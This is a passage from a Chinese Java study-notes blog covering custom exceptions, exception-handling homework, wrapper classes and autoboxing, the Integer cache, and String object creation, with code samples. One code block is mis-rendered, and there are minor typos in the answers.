class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//当我们接收Person对象年龄时，要求范围在18-120之间，否则抛出一个</span><br><span class="hljs-comment">//自定义异常（要求 继承RuntimeException），并给出提示信息。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomException</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">180</span>;<br>        <span class="hljs-keyword">if</span> (!(age &gt;= <span class="hljs-number">18</span> &amp;&amp; age &lt;= <span class="hljs-number">120</span>))&#123;<br>            <span class="hljs-comment">//这里我们可以通过构造器，设置信息</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgeException</span>(<span class="hljs-string">&quot;年龄需要在18-120之间&quot;</span>);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;你的年龄范围正确。&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//自定义异常</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AgeException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgeException</span><span class="hljs-params">(String message)</span>&#123;<span class="hljs-comment">//构造器</span><br>        <span class="hljs-built_in">super</span>(message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108162417848.png" alt="image-20221108162417848"></p><p>一般情况下，我们自定义异常是继承RuntimeException。即把自定义异常做成运行时异常。</p><p>好处是可以使用默认处理机制。</p><h3 id="throw和throws的区别"><a href="#throw和throws的区别" class="headerlink" title="throw和throws的区别"></a>throw和throws的区别</h3><table><thead><tr><th></th><th>意义</th><th>位置</th><th>后面跟的东西</th></tr></thead><tbody><tr><td>throws</td><td>异常处理的一种方式</td><td>方法声明处</td><td>异常类型</td></tr><tr><td>throw</td><td><strong>手动</strong>生成异常对象的关键字</td><td>方法体中</td><td>异常对象</td></tr></tbody></table><p>测试（下面的测试输出为？）：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108163012104.png" alt="image-20221108163012104" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108163038281.png" alt="image-20221108163038281" style="zoom:50%;" /><p>输出：</p><p>进入方法A。</p><p>用A方法的finally。</p><p>制造异常。</p><p>进入方法B。</p><p>调用B方法的finally。</p><p><strong>解析：</strong></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108163554906.png" alt="image-20221108163554906"></p><h2 id="本章作业"><a href="#本章作业" class="headerlink" title="本章作业"></a>本章作业</h2><h3 id="题目1（编程题）"><a href="#题目1（编程题）" class="headerlink" title="题目1（编程题）"></a>题目1（编程题）</h3><blockquote><p>a）编写应用程序EcmDef.java，接收命令行的两个参数（整数），计算两数相除。</p><p>b）计算两个数相除，要求使用方法 cal（int n1， int n2）</p><p>c）对数据格式不正确、缺少命令行参数、除0 进行异常处理。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//a）编写应用程序EcmDef.java，接收命令行的两个参数（整数），计算两数相除。</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//b）计算两个数相除，要求使用方法 cal（int n1， int n2）</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//c）对数据格式不正确(NumberFormatException)、缺少命令行参数(ArrayIndexOutOfBoundsException)、</span><br><span class="hljs-comment">// 除0 进行异常处理(ArithmeticException)。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//先验证输入参数的个数是否正确</span><br>            <span class="hljs-keyword">if</span> (args.length !=<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayIndexOutOfBoundsException</span>(<span class="hljs-string">&quot;参数个数不对&quot;</span>);<br>            &#125;<br>            <span class="hljs-comment">//接受参数,转换成整数</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> Integer.parseInt(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> Integer.parseInt(args[<span class="hljs-number">1</span>]);<br>            <span class="hljs-comment">//将n1，n2传入call</span><br>            <span class="hljs-type">double</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> cal(n1,n2); <span class="hljs-comment">//可能会抛出算术异常</span><br><br>            System.out.println(<span class="hljs-string">&quot;计算结果为：&quot;</span>+res);<br>        &#125; <span class="hljs-keyword">catch</span> (ArrayIndexOutOfBoundsException e) &#123;<br>            System.out.println(e.getMessage());<br>        &#125; <span class="hljs-keyword">catch</span> (NumberFormatException e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;参数格式不正确，需要输入整数。&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ArithmeticException e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;出现了除0的异常&quot;</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> n1,<span class="hljs-type">int</span> n2)</span>&#123;<br>        <span class="hljs-keyword">return</span> n1/n2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="题目2-3"><a href="#题目2-3" class="headerlink" title="题目2"></a>题目2</h3><blockquote><p>说出以下代码是否会发生异常？</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108172127749.png" alt="image-20221108172127749" style="zoom:50%;" /></blockquote><p>第一句可能报出<strong>NullPointerException</strong>空指针异常或<strong>ArrayIndexOutOfBoundsException</strong> 数组下标越界异常。</p><p>最后一句一定会报出<strong>ClassCastExcption</strong>类型转换异常，String不能转换成Int。</p><h3 id="题目3-2"><a href="#题目3-2" class="headerlink" title="题目3"></a>题目3</h3><blockquote><p>写出程序运行结果：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108172811298.png" alt="image-20221108172811298" style="zoom:50%;" /></blockquote><p>输出：BCD</p><h3 id="题目4-1"><a href="#题目4-1" class="headerlink" title="题目4"></a>题目4</h3><blockquote><p>写出程序运行结果：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108173105006.png" alt="image-20221108173105006" style="zoom:50%;" /></blockquote><p>输出：BCD</p><h1 id="章节十三-常用类"><a href="#章节十三-常用类" class="headerlink" title="章节十三 常用类"></a>章节十三 常用类</h1><blockquote><p>Java是一个<strong>面向对象</strong>的编程语言，但是Java中的八种基本数据类型却是<strong>不面向对象</strong>的。为了使用方便和解决这个不足，在设计类时为每个基本数据类型设计了一个对应的类进行代表，这样八种基本数据类型对应的类统称为包装类(Wrapper Class)，包装类均位于java.lang包。</p><p>简单来说，例如:</p><p>Object obj &#x3D; 1</p><p>Int i;</p><p>没办法直接将obj（引用类型）的值赋给i（基本数据类型），但转换成Integer包装类就可以实现。</p></blockquote><h2 id="1-包装类"><a href="#1-包装类" class="headerlink" title="1.包装类"></a>1.包装类</h2><p>针对八种基本数据类型相应的引用类型——包装类。</p><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>boolean</td><td>Boolean</td></tr><tr><td>char</td><td>Character</td></tr><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>int</td><td>Integer</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr></tbody></table><h3 id="相关结构图"><a href="#相关结构图" class="headerlink" title="相关结构图"></a>相关结构图</h3><p>Character和Boolean类似。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108215134036.png" alt="image-20221108215134036" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108215639035.png" alt="image-20221108215639035" style="zoom:50%;" /><p>包装类都有Comparable接口，这也就意味着包装类都是可以进行比较的（comparato）</p><h3 id="包装类和基本数据类型的转换"><a href="#包装类和基本数据类型的转换" class="headerlink" title="包装类和基本数据类型的转换"></a>包装类和基本数据类型的转换</h3><ol><li>jdk5前：手动装箱和拆箱。</li><li>jdk5后：自动装箱和拆箱。</li><li>自动装箱底层调用的是valueOf方法，比如Integer.valueOf()</li></ol><p>例子：Integer和int</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//int &lt;--&gt; Integer 的装箱和拆箱</span><br>    <span class="hljs-comment">//jdk5前</span><br>    <span class="hljs-comment">//手动装箱 int --&gt; Integer</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br>    <span class="hljs-type">Integer</span> <span class="hljs-variable">integer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(n1);<br>    <span class="hljs-type">Integer</span> <span class="hljs-variable">integer1</span> <span class="hljs-operator">=</span> Integer.valueOf(n1);<br>    <span class="hljs-comment">//手动拆箱 Integer --&gt; int</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> integer.intValue();<br><br>    <span class="hljs-comment">//jdk5后自动装箱</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">200</span>;<br>    <span class="hljs-type">Integer</span> <span class="hljs-variable">integer2</span> <span class="hljs-operator">=</span> n2;  <span class="hljs-comment">//底层使用的是Integer integer2 = Integer.valueOf(n2);</span><br>    <span class="hljs-comment">//自动拆箱</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">n3</span> <span class="hljs-operator">=</span> integer2;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="课堂练习-2"><a href="#课堂练习-2" class="headerlink" title="课堂练习"></a>课堂练习</h4><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108221725822.png" alt="image-20221108221725822" style="zoom:50%;" /><p>1）正确，自动装箱（底层Double.valueOf(100d),Float.valueOf(1.5))</p><p>2）第一个返回1.0。因为<strong>三元运算符看做一个整体</strong>，其中精度最高的是Double，所以提升了优先级。</p><p>第二个返回1。因为if和else是独立的语句。</p><h3 id="包装类型和String类型的相互转换"><a href="#包装类型和String类型的相互转换" class="headerlink" title="包装类型和String类型的相互转换"></a>包装类型和String类型的相互转换</h3><p>以Integer和String为例，其他类似。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//包装类（Integer）-&gt; String</span><br><span class="hljs-type">Integer</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><span class="hljs-comment">//方式1</span><br><span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> i + <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment">//方式2</span><br><span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> i.toString();<br><span class="hljs-comment">//方式3</span><br><span class="hljs-type">String</span> <span class="hljs-variable">str3</span> <span class="hljs-operator">=</span> String.valueOf(i);<br><br><span class="hljs-comment">//String -&gt; 包装类（Integer）</span><br><span class="hljs-type">String</span> <span class="hljs-variable">str4</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-comment">//方式1</span><br><span class="hljs-type">Integer</span> <span class="hljs-variable">i2</span> <span class="hljs-operator">=</span> Integer.parseInt(str4); <span class="hljs-comment">//自动装箱</span><br><span class="hljs-comment">//方式2</span><br><span class="hljs-type">Integer</span> <span class="hljs-variable">i3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(str4); <span class="hljs-comment">//使用构造器</span><br></code></pre></td></tr></table></figure><h3 id="包装类的常用方法"><a href="#包装类的常用方法" class="headerlink" title="包装类的常用方法"></a>包装类的常用方法</h3><p>Integer类和Character类的常用方法</p><p>Integer.<strong>MAX_VALUE&#x2F;MIN_VALUE</strong>  ： 返回最大值，返回最小值</p><p>Character.<strong>isDigit(‘a’)</strong>&#x2F;<strong>isLetter(‘a’)</strong>&#x2F;<strong>isUpperCase(‘a’)</strong>&#x2F;<strong>isLowerCase(‘a’)</strong> ： 判断是否为数字&#x2F;字母&#x2F;大写&#x2F;小写。</p><p>Character.isWhitespace(‘a’) ：判断是不是空格</p><p>Character.<strong>toUpperCase(‘a’)</strong>&#x2F;<strong>toLowerCase(‘A’)</strong> : 转成大写&#x2F;小写</p><h3 id="Integer类面试题"><a href="#Integer类面试题" class="headerlink" title="Integer类面试题"></a>Integer类面试题</h3><h4 id="题目1-3"><a href="#题目1-3" class="headerlink" title="题目1:"></a>题目1:</h4><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221111144958617.png" alt="image-20221111144958617" style="zoom:50%;" /><p>分析：</p><p>i和j皆为对象，i&#x3D;&#x3D;j意为判断i和j是否为同一对象，所以输出为False。</p><p>m和n为直接赋值，并不是new Integer()。等同于Integer valueOf。</p><p>查看Integer valueOf(int i)的源码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns an &#123;<span class="hljs-doctag">@code</span> Integer&#125; instance representing the specified</span><br><span class="hljs-comment">     * &#123;<span class="hljs-doctag">@code</span> int&#125; value.  If a new &#123;<span class="hljs-doctag">@code</span> Integer&#125; instance is not</span><br><span class="hljs-comment">     * required, this method should generally be used in preference to</span><br><span class="hljs-comment">     * the constructor &#123;<span class="hljs-doctag">@link</span> #Integer(int)&#125;, as this method is likely</span><br><span class="hljs-comment">     * to yield significantly better space and time performance by</span><br><span class="hljs-comment">     * caching frequently requested values.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * This method will always cache values in the range -128 to 127,</span><br><span class="hljs-comment">     * inclusive, and may cache other values outside of this range.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  i an &#123;<span class="hljs-doctag">@code</span> int&#125; value.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> an &#123;<span class="hljs-doctag">@code</span> Integer&#125; instance representing &#123;<span class="hljs-doctag">@code</span> i&#125;.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span>  1.5</span><br><span class="hljs-comment">     */</span><br><span class="hljs-meta">@HotSpotIntrinsicCandidate</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Integer <span class="hljs-title function_">valueOf</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)<br>        <span class="hljs-keyword">return</span> IntegerCache.cache[i + (-IntegerCache.low)];<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(i);<br>&#125;<br></code></pre></td></tr></table></figure><p>传进去的i如果大于IntegerCache.low且小于IntegerCache.high，返回IntegerCache.cache[i + (-IntegerCache.low)]。</p><p>否则直接返回i。</p><p>注释里标注出了该方法的cache返回为-128 to 127.</p><p>因此，m &#x3D;&#x3D; n的结果为True。</p><p>而x &#x3D;&#x3D; y 的结果为False。</p><h4 id="题目2-4"><a href="#题目2-4" class="headerlink" title="题目2"></a>题目2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//示例一</span><br>Integer i1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>( <span class="hljs-number">127</span> );<br>Integer i2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>( <span class="hljs-number">127</span> ); <br>System.out.println(i1==i2);<br><span class="hljs-comment">//示例二</span><br>Integer i3=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>( <span class="hljs-number">128</span> ); <br>Integer i4=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>( <span class="hljs-number">128</span> ); <br>System.out.println(i3==i4);<br><span class="hljs-comment">//示例三</span><br>Integer i5=<span class="hljs-number">127</span>;<br>Integer i6=<span class="hljs-number">127</span>;<br>System.out.println(i5==i6);<br><span class="hljs-comment">//示例四</span><br>Integer i7=<span class="hljs-number">128</span>;<br>Integer i8=<span class="hljs-number">128</span>;<br>System.out.println(i7==i8);<br><span class="hljs-comment">//示例五</span><br>Integer i9=<span class="hljs-number">127</span>;<br>Integer i10=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">127</span>); <br>System.out.println(i9==i10);<br><span class="hljs-comment">//示例六</span><br>Integer i11=<span class="hljs-number">127</span>;<br><span class="hljs-type">int</span> i12=<span class="hljs-number">127</span>;<br>System.out.println(i11==i12);<br><span class="hljs-comment">//示例七</span><br>Integer i13=<span class="hljs-number">128</span>;<br><span class="hljs-type">int</span> i14=<span class="hljs-number">128</span>;<br>System.out.println(i13==i14);<br></code></pre></td></tr></table></figure><p>1：false</p><p>2：false</p><p>3：true</p><p>4：false</p><p>5：flase</p><p>只要有基本数据类型，判断的是值是否相等。</p><p>6：true</p><p>7：true</p><h2 id="2-String类"><a href="#2-String类" class="headerlink" title="2.String类"></a>2.String类</h2><h3 id="String类的理解和创建对象"><a href="#String类的理解和创建对象" class="headerlink" title="String类的理解和创建对象"></a>String类的理解和创建对象</h3><ol><li><p><strong>String对象用于保存字符串</strong>，也就是一组字符序列</p></li><li><p>字符串常量对象使用<strong>双引号</strong>括起的<strong>字符序列</strong>。例如“你好”，“12.97“…</p></li><li><p>字符串的字符使用<strong>Unicode字符编码</strong>，一个字符两个字节（不分字母汉字）</p></li><li><p>String类常用的构造方法</p><ul><li>String s1 &#x3D; new String();</li><li>String s2 &#x3D; new String(String original);</li><li>String s3 &#x3D; new String(char[] a);</li><li>String s4 &#x3D; new String(char[] a,int startIndex,int count)</li></ul></li><li><p>String类实现了接口<strong>Serializable、Comparable</strong></p></li><li><p>String是<strong>final类</strong>（常量）。不能被其他类继承。</p></li><li><p>String有属性 private final <strong>byte[]</strong> value; 用于存放字符串内容。</p><ul><li>JDK8以前是private final <strong>char[]</strong> value;</li></ul></li><li><p>注意：value是一个final类型，不可以修改（地址）。</p><ul><li><p>指value<strong>不能指向新的地址</strong>，但单个字符的内容是可以变化的</p></li><li><p>&#96;&#96;&#96;java<br>final byte[] value &#x3D; {‘a’,’b’,’c’};<br>byte[] v2 &#x3D; {‘t’,’o’,’m’};<br>value[0] &#x3D; ‘H’;<br>&#x2F;&#x2F;value &#x3D; v2; 不可以修改value地址</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><br><br><br><br><br>**<span class="hljs-type">String</span>的相关接口**：<br><br>![image<span class="hljs-number">-20221111153946993</span>](https:<span class="hljs-comment">//soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221111153946993.png)</span><br><br>**Serializable**：说明<span class="hljs-type">String</span>对象可以串行化（意味着可以网络传输）<br><br>**Comparable**：说明<span class="hljs-type">String</span>对象可以相互比较<br><br>CharSequence：字符序列。<br><br><br><br>**<span class="hljs-type">String</span>构造器**：<br><br>&lt;img src=<span class="hljs-string">&quot;https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221111154603405.png&quot;</span> alt=<span class="hljs-string">&quot;image-20221111154603405&quot;</span> style=<span class="hljs-string">&quot;zoom:50%;&quot;</span> /&gt;<br><br><br><br>### 创建<span class="hljs-type">String</span>对象的两种方式<br><br><span class="hljs-number">1.</span> 方式一：直接复制**<span class="hljs-type">String</span> s = <span class="hljs-string">&quot;tomato&quot;</span>**<br>   - 先从常量池查看是否有<span class="hljs-string">&quot;tomato&quot;</span>数据空间<br>     - 如果有，直接指向；<br>     - 如果没有，重新创建，然后指向<br>   - s最终指向的是常量池的空间地址<br><span class="hljs-number">2.</span> 方式二：调用构造器**<span class="hljs-type">String</span> s = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(<span class="hljs-string">&quot;tomato&quot;</span>)**<br>   - 先在堆中创建空间，里面维护了value属性，指向常量池的<span class="hljs-string">&quot;tomato&quot;</span>空间。<br>     - 如果常量池没有<span class="hljs-string">&quot;tomato&quot;</span>,重新创建。<br>     - 如果有，直接通过value指向。<br>   - 最终指向的是堆中的空间地址。<br><br>结构图：<br><br>![image<span class="hljs-number">-20221111164019918</span>](https:<span class="hljs-comment">//soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221111164019918.png)</span><br><br><br><br>### （四道测试题）<br><br>测试题<span class="hljs-number">1</span>：<br><br>&lt;img src=<span class="hljs-string">&quot;https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221111164119329.png&quot;</span> alt=<span class="hljs-string">&quot;image-20221111164119329&quot;</span> style=<span class="hljs-string">&quot;zoom:50%;&quot;</span> /&gt;<br><br>输出：<span class="hljs-literal">true</span>，<span class="hljs-literal">true</span><br><br><br><br>测试题<span class="hljs-number">2</span>：<br><br>```java<br><span class="hljs-type">String</span> a = <span class="hljs-string">&quot;hsp&quot;</span>;<br><span class="hljs-type">String</span> b =<span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(<span class="hljs-string">&quot;hsp&quot;</span>);<br>System.out.<span class="hljs-built_in">println</span>(a.<span class="hljs-built_in">equals</span>(b));<br>System.out.<span class="hljs-built_in">println</span>(a==b);<br>System.out.<span class="hljs-built_in">println</span>(a==b.<span class="hljs-built_in">intern</span>()); System.out.<span class="hljs-built_in">println</span>(b==b.<span class="hljs-built_in">intern</span>());<br></code></pre></td></tr></table></figure></li></ul></li></ol><p>输出：true、false、true、false</p><p><strong>分析：</strong></p><p>关于intern：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221111192927423.png" alt="image-20221111192927423" style="zoom:50%;" /><p>intern方法，如果池中包含一个等与此String的字符串（用equasl确认），则返回池中的字符串。</p><p>否则，将此String对象添加到池中，并返回此String对象的引用。</p><p>b.intern()方法最终返回的是常量池的地址（对象）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hsp&quot;</span>;  <span class="hljs-comment">//a指向常量池的“hsp”</span><br><span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hsp&quot;</span>); <span class="hljs-comment">//b指向堆中对象value</span><br>System.out.println(a.equals(b));<br>System.out.println(a==b);<br>System.out.println(a==b.intern());<span class="hljs-comment">//常量池已经有hsp了，所以相等。</span><br>System.out.println(b==b.intern());<span class="hljs-comment">//b指向堆，但b.intern()返回的是字符串</span><br></code></pre></td></tr></table></figure><p>测试题3：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hspedu&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s4</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>System.out.println(s2 == s3);<br>System.out.println(s2 == s4);<br>System.out.println(s2.equals(s3)); <br>System.out.println(s1 == s2);<br></code></pre></td></tr></table></figure><p>输出：false、true、true、false</p><p>测试题4：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221111194411642.png" alt="image-20221111194411642" style="zoom:50%;" 